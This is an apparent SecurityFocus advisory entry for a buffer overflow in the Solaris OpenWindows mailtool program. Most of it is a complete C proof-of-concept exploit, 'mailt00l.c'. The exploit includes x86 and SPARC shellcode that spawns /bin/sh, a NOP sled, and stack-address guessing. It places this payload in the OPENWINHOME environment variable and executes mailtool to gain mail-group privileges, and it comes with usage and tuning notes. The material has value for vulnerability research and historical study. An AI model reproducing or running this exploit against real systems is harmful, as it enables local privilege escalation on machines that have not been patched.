source: http://www.securityfocus.com/bid/2787/info

The mailtool program included with OpenWindows in Solaris, contains a buffer overflow vulnerability which may allow local users to execute arbitrary code/commands with group 'mail' privileges.

The overflow occurs when a string exceeding approximately 1010 characters is given as the OPENWINHOME environment variable.

/*
mailt00l.c, by 51 (June 2001)

Proof of concept code, exploiting the recently discovered buffer overflow
in Solaris 8 /usr/openwin/bin/mailtool, yielding GID mail
(http://packetstorm.securify.com/groups/synnergy/mailtool-adv.txt).
Should work with both x86 and Sparc versions, thx to compilation directives.
As a matter of course, the defaults buffersize and offset may need to be
tweaked a bit.

Usage : ./mailt00l [buffersize] [offset]

Shouts to Trick for various mentoring...

mail : kernel51@libertysurf.fr
www.cyberarmy.com
www.g0tr00t.net
*/



#include <stdlib.h>

#define DEFAULT_OFFSET                 0
#define DEFAULT_BUFFER_SIZE            1600

#if defined(__i386__) && defined(__sun__)

#define ARCH "x86 Sun"
#define NOP_SIZE	1
char nop[] = "\x90";
char shellcode[] =
  "\xeb\x3b\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xc1"
  "\x88\x46\xc6\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x17\xe8\xdf"
  "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89"
  "\x5e\x08\x53\xb0\x3b\xe8\xc8\xff\xff\xff\x83\xc4\x0c\xe8\xc8\xff"
  "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff"
  "\xff\xff";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

#elif defined(__sparc__) && defined(__sun__)

#define ARCH "Sun Sparc"
#define NOP_SIZE	4
/* Shellcode ripped from Aleph1 */
char nop[]="\xac\x15\xa1\x6e";
char shellcode[] =
  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";

unsigned long get_sp(void) {
  __asm__("or %sp, %sp, %i0");
}

#endif


int main(int argc, char *argv[])
{
  char *ex[2];
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, n;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  printf("Archi: %s\n", (char *)ARCH);

  if (!(buff = malloc(bsize)))
    {
      printf("Can't allocate memory.\n");
      exit(0);
    }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = buff;
  for (i = 0; i < (bsize - strlen(shellcode)) / 2 - NOP_SIZE; i += NOP_SIZE)
    for (n = 0; n < NOP_SIZE; n++) {
      *(ptr++) = nop[n];
    }


  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  memcpy(buff,"OPENWINHOME=",12);
  putenv(buff);
  printf("Now running: /usr/openwin/bin/mailtool\n");
  ex[0] = "/usr/openwin/bin/mailtool";
  ex[1] = NULL;
  execv(ex[0], ex);
}



